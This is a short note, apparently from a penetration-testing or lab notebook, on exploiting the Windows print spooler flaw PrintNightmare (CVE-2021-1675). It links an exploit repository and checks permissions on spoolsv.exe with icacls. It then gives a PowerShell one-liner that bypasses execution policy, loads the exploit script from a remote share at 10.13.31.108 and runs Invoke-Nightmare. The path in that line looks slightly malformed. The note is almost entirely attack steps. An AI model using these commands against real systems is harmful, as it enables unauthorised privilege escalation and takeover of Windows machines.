PrintNightmare
<https://github.com/calebstewart/CVE-2021-1675>

Enumerate spoolsv. It's usually located here:
icacls.exe "C:\Windows\System32\spoolsv.exe"

powershell -ep bypass . \10.13.31.108\share\CVE-2021-1675.ps1;Invoke-Nightmare 
![unnamed_b0c73133c96342acb03bb2a4a62d3c52](unnamed_b0c73133c96342acb03bb2a4a62d3c52.png)
